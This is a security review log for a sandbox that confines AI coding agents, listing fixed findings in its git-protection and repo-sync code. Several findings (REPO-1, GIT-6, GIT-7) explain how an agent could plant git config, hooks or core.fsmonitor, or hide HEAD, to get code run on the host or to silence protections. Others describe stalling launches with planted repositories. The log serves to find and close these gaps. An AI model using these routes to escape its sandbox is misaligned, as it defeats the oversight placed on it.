Each fix batch was reviewed by an independent reviewer before it was merged, and every HIGH and MEDIUM those reviews found was fixed in the batch (batch 1 hotfix `5bbaacc` … `944eb0c`; batch 2 `a8824e8` … `e426e09`). What follows is what those reviews found and the batches left open, plus REPO-1, the one large defect batch 2 found and fixed outside its own findings. **Reviewed up to `e426e09`** (main, 2026-10-26).

### REPO-1: `repo.sh sync`/`reset` ran git as root, with the host's `~/.ssh` and an open network, on a `.git` the agent can write
- **Status: FIXED (batch 2)** — `1eac805` … `e426e09`; redesigned in `2a8d666` so that git never runs on the volume's own `.git`. Tests are in `tests/test-repo-git-reset.sh`, plus an end-to-end run as root in the seed image.
- Severity: HIGH. Confidence: CONFIRMED (reproduced: a deleted `.git/config` let a sync fetch any repository the host SSH key could read; `core.fsmonitor`, hooks, `commondir`, alternates, replace refs and planted symbolic refs each reached root in turn).
- Introduced: before the window. It was found by the batch 2 review (finding F6 of the first round).
- What changed: every mode of `repo-git-reset.sh` clones the volume's `ai-containers.source` URL into a private directory. The volume's refs are read as plain files, and its worktree is used only as a worktree. `reset` and `sync` finish by replacing the volume's `.git`. The rest of this section lists the LOWs that redesign left.

### GIT-2: The include walk is bounded per config but not per launch, so planted repositories can make every launch take minutes or hours
- **Status: FIXED (batch 9)** — `9bd3729` … `6a0b37f`: a launch-wide budget of 1000 include entries with a WARNING when it is hit; values over PATH_MAX inert; `_path_walk`/`_link_walk` bounded at 256 steps and 40 links, past which a way is reported as not followed to the end; `config.worktree` walked only where `extensions.worktreeConfig` is on, or when the common config cannot be read (test G38 and G40 on). Reviewed over 19 rounds; what those left open is GIT-6 on, in section 10.
- Severity: MEDIUM. Confidence: CONFIRMED (measured)
- Location: sandbox.sh: `if (( ++ient > 100 )); then icut=1; ii=${#ifile[@]};` and `if (( ++ients > 1000 )); then icut=1; ii=${#ifile[@]};` (as fixed; the launch-wide count was added in batch 9, and moved after the empty-value skip in batch 10), and `_path_walk()`.
- What's wrong: there are three problems.
  - Each config gets 100 include entries, and each git directory has two configs. `config.worktree` is walked whenever it exists, even with `extensions.worktreeConfig` off, when the host's git never reads it. A launch can protect up to `SANDBOX_GIT_MAX` (200) git directories, and the agent can plant all of them. The 1000-files-per-launch budget limits files, not entries.
  - `_path_walk` is quadratic in the number of path components, because it strips one component per step with `rest="${rest#*/}"`.
  - A config with exactly 100 entries never trips the cut, so it gets no WARNING.
- Evidence: the reviewer measured the launch time in three setups.
  - 150 planted repositories, each with 100 `include.path = /nonexistent/fN` lines in both configs, took 81 s to launch (13 s without the includes).
  - One config with 100 entries of 2,000 components each took 54 s.
  - One config with 10 entries of 8,000 components each took 71 s.
- Fix direction: add a launch-wide entry budget beside the file budget, with a WARNING when it is hit. Treat an include value longer than PATH_MAX as inert. Bound the steps of `_path_walk`/`_link_walk`, and treat an entry that hits the bound as exposed, with a warning. Walk `config.worktree` only where `extensions.worktreeConfig` is on, as the hooks check already does. G38 should plant many repositories and long paths, because its timing half alone does not catch a removed cap (5000 entries took 12 s, under its 15 s threshold).

### GIT-3: A gitlink skipped by the path checks is skipped silently
- **Status: FIXED (batch 9)** — `9bd3729` … `6a0b37f`: a skipped gitlink gets a `WARNING:` naming it, five per index and then a count.
- Severity: LOW. Confidence: PLAUSIBLE
- Location: sandbox.sh: `git_dirs_in()` (the `*/../*|*/./*|*//*` case and the `pwd -P` comparison on each gitlink path).
- What's wrong: the skip is correct for an agent-written index. It also fires, with nothing printed, in three legitimate cases:
  - a checkout whose on-disk name differs from the index (case on APFS, NFC against NFD on HFS+);
  - a submodule directory the launching user cannot search;
  - a checkout the user replaced with a symlink.
  If such a checkout sits under a pruned `vendor/` with an embedded `.git` directory, it is not protected, and nothing says so. The other "not followed" paths here do warn. Related and already documented under "Not covered" in AGENTS.md: a sparse index's gitlinks are not followed either.
- Fix direction: print a `WARNING:` naming the gitlink whenever either check skips one.

### GIT-4: A concurrent container can swap the index or a sharedindex file for a FIFO between the check and the read
- **Status: FIXED (batch 9)** — `9bd3729` … `6a0b37f`: `ls-files` runs under `timeout -k 2 10` where there is one, and a timeout counts as an unreadable index; every config read, `commondir` and `.git` file read only a regular file, and any FIFO or device inside what the launch binds read-only refuses it, the file binds checked again where the manifest records them.
- Severity: LOW. Confidence: PLAUSIBLE (with the guard removed, G37's hang ran to the 60 s timeout)
- Location: sandbox.sh: `_git_index_read()` (the `sharedindex` regular-file test, then `ls-files`).
- What's wrong: the guard checks, then uses. A second container on the same tree can replace `sharedindex.*`, or `index` itself, with a FIFO after the `-f` test, and the unbounded `ls-files` then hangs the launch. The gitlink `pwd -P` check has the same window against the host-side writes that follow it (`commondir`, `hooks/`, `config.worktree`). Mount time does not re-verify those writes, but what they write is benign.
- Fix direction: run the `ls-files` under a watchdog like the services runner's, and treat a timeout as an unreadable index.

### GIT-5: Nits in the include walk
- **Status: FIXED (batch 9)** — `9bd3729` … `6a0b37f`.
- Severity: NIT
- `ient > 100` counts empty-value entries too.
- `unset iseen; local -A iseen=()` deletes a caller's or a global `iseen` on the first pass (checked on bash 5.1 and 5.3). None exists today. `local -A iseen=()` followed by `iseen=()` avoids it.

### LNCH-4: An unrepresentable launcher candidate is not overlaid, yet everything nested in it is discounted from `SANDBOX_LAUNCHER_MAX`
- **Status: FIXED (batch 9)** — `9bd3729` … `6a0b37f`: representability is decided before counting, through the shared `_overlay_buildable`, so only an overlay that is made covers what is nested in it (test T46).
- Severity: LOW. Confidence: CONFIRMED (reproduced)
- Location: sandbox.sh: `lcand[${cat[i]}]="$i"` (as fixed; it read `lcand[${cat[i]}]=1` before batch 9).
- What's wrong: the rule is that only an overlay that is actually made covers what is nested in it. Mount roots are excluded from `lcand`, but a candidate that `_mount_representable` rejects is not. It gets "cannot protect … stays writable" and no overlay, yet its nested launchers are not counted.
- Evidence: a launcher named `bad$'\xff'` holding 3,000 nested launchers, with `SANDBOX_LAUNCHER_MAX=5`, exited 0 after 14 s with 3,001 WARNINGs. No extra bind mounts were made, because every nested path is unrepresentable too. The damage is a flood of WARNINGs that buries real ones, which is what the cap exists to bound.
- Fix direction: decide representability before counting, or count the overlays actually emitted.

### ENV-7: A committed `IMAGE_NAME` can retag another project's image
- **Status: FIXED (batch 10)** — `86427b0`, `162d4c3`: for an `IMAGE_NAME` the committed `sandbox.env` chose (`ai_containers_build_retag_guard()`), `build.sh` refuses, before anything is written, to retag an image with no `ai-containers.*` label key (one built before v0.6.0 is recognised by the Dockerfile's title and rebuilt with a NOTE) or one whose `ai-containers.project` label names another project that still exists, is not an absolute path, or lies under a directory you cannot search; one built before that label, or for a project path that no longer exists, is rebuilt with a NOTE. A committed `IMAGE_NAME` is a local name, no `/`; a different name given as `build.sh`'s argument is not checked (`86427b0` checked it; fixed after the review of `162d4c3`). The user's choice was to refuse another project's image, so this replaces the warning the fix on main (`c89f1d5`) gave (tests/test-image-retag.sh, which runs `build.sh` against a fake `docker`).
- Severity: LOW. Confidence: PLAUSIBLE (from code)
- Location: build.sh: `remove_replaced_image`. sandbox-common.sh: `env_value_portable()` refuses only the seed image.
- What's wrong: `IMAGE_NAME` stays portable. A committed `sandbox.env` can name a sibling project's tag, or a base image such as `ubuntu:24.04`. `./build.sh` then retags it with an image built from this project's `sandbox.conf` and `allowlist-*.d/custom.txt`, and removes the old image. The other project's next restricted launch then runs with this project's allowlist, and gets only a provenance warning.
- Fix direction: refuse a portable `IMAGE_NAME` that contains a registry host or `/`. Or warn, or refuse, when the existing tag carries no `ai-containers.*` label from this project. Or derive the name from the project.

### REPO-2: `sync` drops an `am`, merge, cherry-pick or revert that is still in progress
- **Status: FIXED (batch 4)** — `ec17745` (pull refuses `rebase-apply/`, `rebase-merge/`, `sequencer/`, `MERGE_HEAD`, `CHERRY_PICK_HEAD`, `REVERT_HEAD`, `BISECT_START`).
- Severity: LOW. Confidence: CONFIRMED (reproduced)
- Location: repo-git-reset.sh: `cmd_pull()`.
- What's wrong: `.git` is replaced, and with it `rebase-apply/`, `rebase-merge/`, `sequencer/`, `MERGE_HEAD`, `CHERRY_PICK_HEAD` and `REVERT_HEAD`. With `git am` stopped on patch 1 of 2, `pull` returned 0 and the two patches, which existed only in `rebase-apply/`, were gone. `git pull --ff-only` keeps that state.
- Fix direction: refuse when any of those names, or `BISECT_START`, exists in `.git`.

### REPO-3: A split index is refused with "use reset", which wipes far more than a sync would
- **Status: FIXED** (2026-10-29). `cmd_pull` reads the copy of the index under `LC_ALL=C` and, when git cannot open the `sharedindex.<oid>` a split index names, takes that name from git's error (40 or 64 hex digits, the rest cut off), copies `.git/<that name>` beside the copy if it is a regular file and the two together are at most 512 MiB, as the index alone was bounded, and reads the copy again; git checks only that its trailing checksum is the one named, and a second failure is refused as damaged. A missing, oversized or non-file shared part is refused by name; a link was already refused with everything in `.git` that is neither file nor directory. git's errors are kept to their last 4 KiB. `tests/test-repo-git-reset.sh`: a split index is synced, in a SHA-1 and a SHA-256 repository; a staged change is found in either part (staged before the split, or after it); six broken shared parts are refused; a damaged index that is not split is refused as damaged, and one of ignored extensions with its errors bounded; on the old helper 9 checks fail. Its review: the first version read git's stderr whole, which for an index of ignored extensions is about three times its size: a 496 MiB one got the helper killed for memory in the seed image at `git_helper_run`'s 4 GiB (MEDIUM); it bounded the shared part apart from the index, doubling what could be read, and said git checks the copied file is the index named, when git compares only its trailer (LOW). Its second look: the trailer case wrote 0xff over a last byte that is 0xff in one run of 256, changing nothing (now another byte). Case 640 runs them in the seed image. Batch 4 (`ec17745`) had made the refusal name `git update-index --no-split-index`.
- Severity: LOW. Confidence: CONFIRMED (reproduced)
- Location: repo-git-reset.sh: `cmd_pull()` (the staged-changes check reads a copy of the index without its `sharedindex.*`).
- What's wrong: a clean checkout with `core.splitIndex` on cannot be synced. The suggested `reset` drops untracked files and every other local branch.
- Fix direction: copy the regular `sharedindex.<oid>` the index names beside the copy, or tell the user to run `git update-index --no-split-index`.

### REPO-4: A reftable repository is misread by every mode, and `reset` deletes its branches without listing them
- **Status: FIXED (batch 4)** — `ec17745` (every mode refuses a reftable repository; checked against one made by git 2.56).
- Severity: LOW for now. It becomes MEDIUM if git makes reftable the default. Confidence: CONFIRMED (reproduced)
- Location: repo-git-reset.sh: `volume_refs()`, `cmd_inspect()`.
- What's wrong: a reftable `.git` has a stub file at `refs/heads` and no loose or packed refs.
  - `inspect` lists `BRANCH|/dst/.git/refs/heads|?|` and never names the real branches, so the confirmation shows none of them at risk.
  - `reset` then deletes them.
  - `pull` refuses with a misleading "cannot read the tip of .invalid".
- Fix direction: refuse any mode when `.git/reftable` exists or `refs/heads` is not a directory, with a message saying why.

### REPO-5: Refusing every nested `.git` also blocks common legitimate checkouts
- **Status: FIXED** (2026-10-28; the user's choice of the fix direction). `check_volume()` takes a mode for a `.git` below the top level: `refuse` (sync, as before), `list` (inspect: `NESTED|<path>`, 50 and then `NESTED-MORE|<n>`) and `defer` (reset). Reset then clones and checks the primary branch, and only then `remove_nested()` removes each with `rm -rf` (a `REMOVED|<path>` record each, rendered by `repo.sh` even when the reset then fails) and checks none is left — right before the first git that uses the volume as a worktree, so none is read and a reset that cannot go ahead removes nothing. A `NESTED_PENDING` flag makes that git refuse if the removal is ever skipped (automated security review). `find` follows no link, so a nested `.git` that is a link is removed as one, and one reached through a linked directory is neither listed nor removed. `repo.sh` lists each as `REMOVE <path>` in the confirmation and counts it at risk. Its review found the tests not pinning either property (a mutant that removed nothing passed, `clean` deleting them anyway; so did `find -L`) and the removal running before the clone: `tests/test-repo-git-reset.sh` now has a remote gitlink at `sub` with the volume's `sub/.git` naming a repository whose config includes a FIFO outside the volume — bounded by a FIFO writer, since an orphaned git held `p_timeout`'s capture open — a linked directory holding a `.git`, and an unreachable remote that must leave a nested repository alone; each mutant (no removal, `find -L`, removal before the clone) fails one. sync still refuses them; the summary in `tests/test-repo-destructive.sh`. falsify on the helper: 206 of 219, ledger OK.
- Severity: LOW. Confidence: CONFIRMED
- Location: repo-git-reset.sh: `check_volume()` (`-name .git`).
- What's wrong: initialised submodules, `pip install -e` checkouts under `src/`, and clones inside ignored directories all block `inspect`, `reset` and `sync`. That includes `reset`, which would delete them anyway.
- Fix direction: in `reset` (or `inspect`), list the nested `.git` paths, and after confirmation remove them with `rm -rf` before any git runs, so git never reads them. `sync` keeps refusing them.

### REPO-6: `pull` is not atomic once the worktree has been fast-forwarded
- **Status: FIXED** (2026-10-28). After the fast-forward, `pull` records how to undo it (`UNDO_DIR`, `UNDO_FROM`, `UNDO_TO`, initialised empty so nothing comes in from the environment), and `die()` runs the reverse two-way merge before it exits: the checkout is put back, and the message says so — or that it could not be, and `reset` is the way out. `install_git_dir()` clears it before it removes the old `.git`: its review found the first version undoing the worktree after the old `.git` was gone and saying "put back as it was" over a volume with no `.git`. From there the new `.git`, which matches the checkout, is kept — a partly failed removal deleted it — and the error names the `mv` that installs it; tested for a failing `mv` and, non-root, a partly removed `.git`, each red on the old helper, and following the named move gives a clean checkout. `tests/test-repo-git-reset.sh` fails the copy of the new `.git` with a `cp` shim: the checkout ends at its old commit with nothing changed (red on the old helper, which left the remote's new file behind under the old `.git`).
- Severity: LOW. Confidence: PLAUSIBLE
- Location: repo-git-reset.sh: `read-tree -m -u`, then `install_git_dir()`.
- What's wrong: a failure after the two-way merge leaves the worktree at the new tip under the old `.git`, for example a full disk while the new `.git` is copied. The old `.git` is intact, because the stage-then-swap holds, but the checkout now looks like reverse uncommitted changes, and every later sync refuses.
- Fix direction: on failure after the merge, run a reverse `read-tree -m -u <remote tip> <old tip>`. Or say in the error that `reset` is the way out.

### REPO-7: The git helper's container has a memory limit and nothing else
- **Status: FIXED (batch 4)** — `0c15b88` (`--memory-swap`, `--pids-limit 512`, `REPO_HELPER_MEMORY` validated, documented and machine-only, exit 137 named). No time limit yet; Docker's 6 MB minimum is left to Docker's own refusal.
- Severity: LOW. Confidence: CONFIRMED (from code)
- Location: repo.sh: `git_helper_run()` (`--memory "${REPO_HELPER_MEMORY:-4g}"`).
- What's wrong: there is no `--memory-swap`, no `--pids-limit` and no time limit. `REPO_HELPER_MEMORY` is neither validated nor documented. An out-of-memory kill gives only the generic failure message.
- Fix direction: add `--memory-swap` equal to the memory, a `--pids-limit`, and a watchdog. Validate the value, document the key, and name exit 137 as an out-of-memory kill.

### REPO-8: `reset`'s confirmation lists branches only, and nothing a reset removes can be undone
- **Status: FIXED** (2026-10-28). `repo-git-reset.sh: cmd_inspect()` emits `STASH|<entries>` and, per local tag, `TAG|<name>|<kept>|<commit on a remote branch>` — kept when the fresh clone has it at the same object, so reset brings it back. `repo.sh: collect_inspections()` lists the stash and every tag not kept in the confirmation, and counts the stash, a tag whose commit is on no remote branch, and an unknown one in the WARNING with unpushed branches. Its review found two more: the primary branch's own unpushed commits were skipped by the summary although reset moves it to the remote's tip, so they were lost unannounced (older than this fix) — now a `MOVE <primary> to the remote's tip — N commit(s) not on any remote` line, counted at risk; and a history walk per tag (1000 tags: 32 s to inspect) — the walk now runs only for a tag reset drops. A tag whose object name could not be read (a hand-written name with a newline) is unknown, not matched as kept, and `show-ref --verify` is asked rather than `rev-parse`, which resolved revision syntax in a name. Reflogs and unreferenced objects are still replaced unannounced, as AGENTS.md says. Hermetic: real git in `tests/test-repo-git-reset.sh` (a stash; tags on an unpushed commit, on a pushed one, and pushed themselves), the summary in `tests/test-repo-destructive.sh`; both red on the old code. `docs/repos-and-mounts.md`'s sample shows them.
- Severity: LOW. Confidence: CONFIRMED
- Location: repo-git-reset.sh: `cmd_inspect()`; repo.sh's rendering of its records.
- What's wrong: replacing `.git` also removes the stash, local tags, notes, reflogs and objects that nothing else references. A tag holding the only reference to a commit disappears without being mentioned. Before batch 2, a mistaken reset could be recovered from the reflog until the next gc. It no longer can.
- Fix direction: `inspect` emits `STASH|<n>` and `TAG|<name>|<on-remote>` records, and repo.sh renders them in the confirmation.

### REPO-9: `sync` drops other branches' upstream tracking and other remotes
- **Status: FIXED** (2026-10-28). `pull` sets each kept branch's upstream to its same-named branch on `origin` where there is one and the branch is behind or at it (not one that diverged from it, which would report "diverged"; its review), as it did for the checked-out branch alone; other remotes stay a documented loss. `tests/test-repo-git-reset.sh`: a second branch tracking `origin/shared` still does after a sync (red on the old helper, which left it untracked). The new `|| true` joins the ledger's EQUIVALENT group for the existing one.
- Severity: LOW. Confidence: CONFIRMED
- Location: repo-git-reset.sh: `--set-upstream-to="origin/$b"` (only the checked-out branch is re-tracked).
- What's wrong: every other branch loses its upstream, and every remote except `origin` is dropped with its `refs/remotes`. That is recoverable by re-fetching, but surprising after a "sync".
- Fix direction: restore the upstream of each branch that has a same-named branch on `origin`. Other remotes stay a documented loss, because their URLs are agent-written config.

### REPO-10: Nits in the repo helper
- **Status: FIXED** (2026-10-29), item by item, each measured. A loose ref named with a newline or tab is one record, `?` for the character and the state unknown (`volume_refs()`), where it split into fake `BRANCH|` records. `pull` refuses a submodule's path that is a link or a file (measured: it kept the link); `reset` already recreated the empty gitlink directory (measured, link and absent alike). The staged-changes check reads the index's entries (`ls-files -s -z`) into a fresh index (`update-index -z --index-info`, which needs no object the clone lacks) and diffs that, so a cache tree that lies hides nothing (a hand-patched index, its checksum recomputed: plain `diff-index --cached` saw no change); an added entry of the empty blob, which is what `git add -N` stages, is not a change, and unmerged entries are refused by name. `sync_from_git()` prints a record type it does not know verbatim. A packed-refs line over 4200 bytes is refused by `awk`: written first as `grep '^.\{4201\}'`, it was a regex error under the seed image's musl (no count past 255), and the check passed there. The index copy is bounded at 512 MiB. What the fast-forward replaces must hold only what the branch tracks: every path the remote adds or retypes is walked from the top following no link, so an untracked or IGNORED file where the remote now tracks a path, a file where it now has a directory, an ignored file in a directory it turns into something else, and any file in a submodule's directory at or below such a path are refused, where read-tree, as `git pull --ff-only` does, overwrote the ignored file and deleted the rest (measured; the submodule case predates this batch, found by its review, M3; one below a retyped directory by its second review, M-1, after the rewrite had turned the first version's accidental refusal of it into a deletion). Every git and find in that walk fails closed, `diff-tree` is read from a file, and a directory holding only directories is no obstacle (second review, L-2, L-3). A third review found the skip for a directory turned into a submodule taking an ignored file or link at that path too, which git replaces (now only a real directory is skipped), and two checks unpinned: the literal pathspec of the submodule listing (a `:x` directory whose only content is a submodule's) and a parent the tip tracks as a directory (an ignored file standing over a directory holding only a submodule); each has a test now, and a PATH shim makes `diff-tree`, `ls-files -o`, `ls-tree` and `find` fail in turn, each required to refuse. The first version checked added paths only and refused ordinary fast-forwards: a directory turned into a file, a link or a submodule, and a rename over a tracked link (review, M1); each is a test now, passing. The index bound is `-size +524288k`, which busybox's find takes (it has no `M`, and the error read as "small enough"; review, M2), and a failing find refuses. The packed-refs refusal is `sync`'s only, so inspect and reset, the way out, still work (review, L2). `sync_from_git()` renders the helper's records when it fails too (L4), a volume path ending in a slash is refused (it defeated the `.git` prune), and the branch counts include the remote's tags, as `on_remote()` does. Tests added: the cache-tree index, intent-to-add, unmerged entries, a damaged index, an ignored file, a submodule path as a link, the long packed-refs line, a branch name with a newline, a `.git` symlink, two levels of nesting; each behaviour test red on the old code. The two environment gaps: new integration case `640-repo-helper-in-seed-image` runs `tests/test-repo-git-reset.sh` inside the seed image as root and as a user (so the fail-closed `find` test runs there too), on its git 2.45; it found the musl regex bug, and mutation `640-packed-refs-grep-interval` puts it back (both runs red on exactly that assertion).
- Severity: NIT
- A newline in a loose ref's file name splits the helper's output into fake `BRANCH|` records. Names are shown sanitised, but the record structure is not.
- `--ignore-submodules=all` hides a gitlink replaced by a symlink, so `pull` succeeds and keeps the link. `reset` does not recreate an empty gitlink directory.
- An intent-to-add entry (`git add -N`) is refused as a staged change, although nothing would be lost.
- `diff-index --cached` trusts the index's cache-tree extension, so a hand-crafted index can hide staged entries. Only the agent's own data is at stake.
- `sync_from_git` drops record types it does not recognise. Unlike `reset_git`, it does not print them verbatim.
- A packed ref longer than the `cut -c1-4200` limit is truncated rather than refused.
- The index copy has no size or time bound.
- Ignored files the remote now tracks are overwritten, as `git pull --ff-only` also does. The docs' "an untracked file the remote now tracks" reads as covering every untracked file.
- Tests missing:
  - `diff-index` exiting 128;
  - intent-to-add and unmerged entries;
  - operations still in progress;
  - nesting more than one level deep;
  - a `.git` symlink.
  Two more gaps: the fail-closed `find` test runs only when not root, and the hermetic suite runs the host's git (2.56), not the seed image's (2.45).


### REPO-11: `repo.sh rm`/`reset` act on a base volume whose label names another repo
- **Status: FIXED** (2026-10-28). `repo.sh: foreign_base_owner()` reads the base volume's `ai-containers.repo` label; `cmd_rm()` refuses one labelled for another repo before its prompt, and `reset` lists it as left untouched (`collect_inspections()`, without inspecting it) and skips it in `reset_one()` before anything is removed, its working copies included. `sync_one()` skips it too — its review found `sync` running `rsync --delete` and a `chown` into another repo's volume, or the `pull` helper — and `add` no longer calls such a volume stray. `rm`'s refusal names the prefix the volume belongs to and how to drop the registry entry alone. Reset's summary checks it before the path branch (it announced a path repo on another repo's volume as re-mirrored), and its no-primary line now says the working copies are still removed, which they are, by design. An unlabelled volume names no owner and is handled as before; a docker error between the existence check and the label read would let one through, accepted. Hermetic, in `tests/test-repo-destructive.sh`, each red on the old code: with `docs`'s base volume relabelled for `other`, the old code's `rm docs --yes` removed it and both working copies, and `reset` ran the git helper on it four times and removed the working copies; now neither removes anything.
- Severity: LOW. Confidence: CONFIRMED (reproduced)
- Location: repo.sh: `cmd_rm()` and `reset_one()` (the base volume is `repo_volume_name "$name"`, checked by name only).
- What's wrong: under a nested prefix the names collide. `repo.sh rm team-repo-x --yes` deleted repo `x`'s base volume of prefix `<p>-repo-team`, labelled `ai-containers.repo=x`, and left its working copy behind. You have to type the colliding name, and the prompt names the volume.
- Fix direction: refuse when the base volume's `ai-containers.repo` label differs from the name given, in both `rm` and `reset`.

### REPO-12: Leftovers of the batch 4 reviews
- **Status: FIXED** (2026-10-29), item by item. The report: `env_var()` exits 0 when the file sets the key, even empty, and `launcher_group()` and `resolve_env_var()` consult `sandbox.env` only when `sandbox.local.env` does not set it, as the launcher does (an empty local `AI_CONTAINER_GROUP=` showed `sandbox.env`'s group where the launcher used `default`; an empty `CONTAINER_CPUS=` there showed `sandbox.env`'s 4.0); the comments above both say so, and the note reads "no AI_CONTAINER_GROUP, or an empty one". The `host`-then-another case no longer differs: `host` is refused at launch since batch 11, and the first value wins in both. A legacy unlabelled volume named `<repo>--wc-*` is decided by the registry (`unlabelled_owner()`): a base when it is exactly a registered repo's volume name, otherwise the working copy of the registered repo with the longest matching base. Both `repo_volume_kind()` and the per-repo `repo_workcopy_volumes <name>` use it; the first version reached only `gc` without `--repo`, and its review found `rm`, `reset` and `gc --repo` of `docs` still deleting `docs--wc-ui`'s base, and a legacy repo's own copies counted as docs'. Names are compared as text, with no process per registered repo (a registered name is `[a-z0-9-]+`). Its review also found re-init keeping only the `KEY="` line of a multi-line value, which never closed and swallowed every key after it: the whole value is carried now, or dropped with its key. The re-init carry-forward writing a line verbatim, CR included, is pinned by a test as the intended behaviour. The `docker volume inspect` calls are gone from `repo.sh list`, `gc` and `reindex` too (2026-10-29, at the user's request): `docker_volume_labels_load()` reads every repo volume's labels with one `docker volume ls --format`, into a table loaded in the command's own shell, which the `$( )` reads inherit; `docker_volume_label()`, the new `docker_volume_present()` and `volumes_named()` answer from it for every volume under the repo prefix, and inspect or list as before otherwise, and whenever the listing printed names alone (every hermetic fake but the destructive test's). One `docker volume` call per command where `list` made 29 in the test world, at about 28 ms each; `rm`, `reset`, `sync` and the launch are unchanged. Each value is read as `{{json (.Label "k")}}`, and one that needed escaping drops the table: its review showed a launch directory holding a newline forging whole records on real Docker (a legacy base taken for a working copy, a phantom registry entry), and the names keep docker's own natural order (`p_9` before `p_10`), where a sort differed by locale. `list --sizes` asks again right before its `docker run -v`, which would otherwise recreate a volume removed since the table was loaded. Checked against real Docker (labelled volumes, a space in a value, natural order, the forged record), and in `tests/test-repo-destructive.sh`, in C and en_US.UTF-8: `list`, `list --copies`, `gc` and `reindex` print the same with the table, without it and with its listing failing, over a world with a registered repo with no volume, an unlabelled copy, a nested-prefix base and a lookalike name; `gc --yes`, `gc --repo docs --yes` and `gc --unused --yes` remove exactly the same volumes; and the coverage rules are asked directly. The review's surviving mutants each red. Tests: `tests/test-report.sh` (the empty local value, `n/a` exactly; a project-init-shaped local file that sets none of the keys; a closed multi-line local value; the note), `tests/test-repo-destructive.sh` (gc, gc --repo, rm and reset with the unlabelled base; the legacy repo's own copy), `tests/test-project-init.sh` (the CRLF line; a multi-line value and the key after it); red on the code each covers, and the review's two `env_var` mutants (no `END`, no `found` in the multi-line branch) each red.
- Severity: LOW/NIT
- The report's group column still differs from the launcher in two cases:
  - an empty `AI_CONTAINER_GROUP=` in `sandbox.local.env` (the launcher uses `default`, the report the `sandbox.env` group);
  - `host` then another group in `sandbox.env` (the launcher skips the refused `host` and uses the second).
  The fix is to have `env_var` report presence apart from the value, and to keep scanning past a refused value. An empty value in `sandbox.local.env` is treated as unset by the report in general.
- Stale comments above `launcher_group` and `env_var` in ai-containers-report.sh; the note "sets no AI_CONTAINER_GROUP" also shows when the group was ignored or empty.
- A legacy unlabelled base volume named `<repo>--wc-*` is still taken for a working copy.
- Each volume now costs one to three `docker volume inspect` calls in discovery.
- The re-init carry-forward writes a kept line verbatim, a CRLF line included (harmless: the loader strips the CR); the test does not pin verbatim against normalised.
## 10. Found while fixing batch 9

Batch 9 (`9bd3729` … `6a0b37f`) went through 19 review rounds. Every HIGH and MEDIUM they found was fixed before the merge; what follows is what they left open, each checked against `6a0b37f`: 14 GIT (8 LOW, 6 NIT) and 10 LNCH (7 LOW, 3 NIT). "Reproduced in rNN" means that review round reproduced it, and the code it hit is unchanged at `6a0b37f`.

### GIT-6: rewriting a linked worktree's `gitdir` back-pointer silences protection of its submodules
- **Status: FIXED (batch 10)** — `86427b0`: the gitdir back-pointer keeps a worktree quiet only if it is a regular `.git` outside every writable mount, physically where it says, that names this git directory back (G80).
- Severity: LOW. Confidence: CONFIRMED (reproduced: the gdsil repro gives 4 binds on `vendor/wt/x/.git`; with `GD=1`, 0 binds and no WARNING)
- Location: sandbox.sh: `if [[ "$(cd "$back" 2>/dev/null && pwd -P)" == "$g" ]]; then continue; fi`
- What's wrong: the "no worktree is known" WARNING is skipped when a worktree's `gitdir` names an absolute path outside every writable bind. It is skipped even when that path does not exist. `gitdir` is not a protected file, so the agent can rewrite it.
- Failure scenario: a linked worktree is checked out under a pruned `app/vendor/wt`, and its index records an embedded repo `x`. The agent writes `/elsewhere/.git` into `.git/worktrees/wt/gitdir`. The next launch makes no binds for `vendor/wt/x/.git` and prints nothing. `x`'s config and hooks stay writable for the host's git.
- Fix direction: stay silent only when the target exists and is outside every writable bind. Otherwise keep the WARNING. Note: the agent can get the same effect by deleting the gitlink from the worktree's own writable index, so this narrows a gap but does not close it.

### GIT-7: deleting or renaming HEAD during a session unprotects the repository at the next launch
- **Status: FIXED (batch 10)** — `86427b0`: a regular `commondir` alone makes a git directory, and a `.git`, or a worktree's or submodule's git directory inside one, counts whatever its `HEAD` holds (G77, G78, G88).
- Severity: LOW. Confidence: CONFIRMED (reproduced: `hide.sh MODE=head` gives 4 binds at launch 1 and 0 at launch 2, rc=0, nothing printed)
- Location: sandbox.sh: `[[ -L "$1/HEAD" ]] || [[ -e "$1/HEAD" && ! -d "$1/HEAD" ]] || return 1`
- What's wrong: a git directory is recognised only by its HEAD. HEAD is not bound and only `.git` itself is pinned, so the agent can remove HEAD. A `.git` directory hit in the scan is dropped (`continue`) unless it is unlistable.
- Failure scenario: in session 1 the agent runs `mv .git/HEAD .git/H`. Launch 2 binds nothing for that repository. In session 2 the agent puts HEAD back and writes `core.fsmonitor` into `config`. The host's next `git status` runs it. Between the two launches the host's git says "not a git repository", which a user may notice.
- Fix direction: treat a directory that holds the launcher's own `commondir` placeholder (exactly `./`) as a git directory whatever its HEAD. Or always queue a `-name .git -type d` hit for protection.

### GIT-8: the gitlink follow costs one subshell per (gitlink, worktree top), with no per-index budget
- **Status: FIXED (batch 10)** — `86427b0`: one subshell resolves every checkout of an index, and an index recording more than 1000 gitlinks refuses the launch (G82).
- Severity: LOW. Confidence: CONFIRMED (reproduced: the biglinks repro, 20k gitlinks, takes 16 s with 19 decoy `.git` files naming the worktree and 1 s with none. r9 measured 83 s for 5k gitlinks × 20 tops when the checkouts exist)
- Location: sandbox.sh: `if [[ "${gres[$co]:-}" != "$co" ]]; then`
- What's wrong: for each gitlink, the loop runs once per top (up to 20, any of them a `.git` file the agent planted). It forks a `$(cd; pwd -P)` subshell whenever the checkout path exists. Nothing caps the gitlinks followed per index.
- Failure scenario: the agent writes 100k gitlinks into a writable worktree index, plants 19 `.git` files naming that worktree, and `mkdir`s the checkout paths. Every later launch takes tens of minutes. It still succeeds, and nothing is refused.
- Fix direction: resolve `co` without forking (a `cd -P` in the current shell, restoring the directory). Or cap the gitlinks followed per index (about 1,000), with a WARNING past the cap.

### GIT-9: every planted repository is scanned and its index read before SANDBOX_GIT_MAX refuses
- **Status: FIXED (batch 10)** — `86427b0`: past `SANDBOX_GIT_MAX` the scan stops following and the launch is refused, whatever the protection loop would count (G83, G85).
- Severity: LOW. Confidence: CONFIRMED (reproduced: `gitmax-cost.sh 2000` takes 21 s before `ERROR: the writable mounts hold more than 200 git directories`)
- Location: sandbox.sh: `if (( gn >= gitmax )); then`
- What's wrong: `git_dirs_in` runs over every mount and follows every `.git` file and index (a `git config`, `ls-files` and `grep` per git directory) before the protection loop counts against the limit. With the index read under `timeout -k 2 10`, a concurrent container swapping indexes for FIFOs can make each read cost up to 12 s.
- Failure scenario: the agent plants 20k small repositories. Each later launch spends minutes scanning, and is then refused anyway.
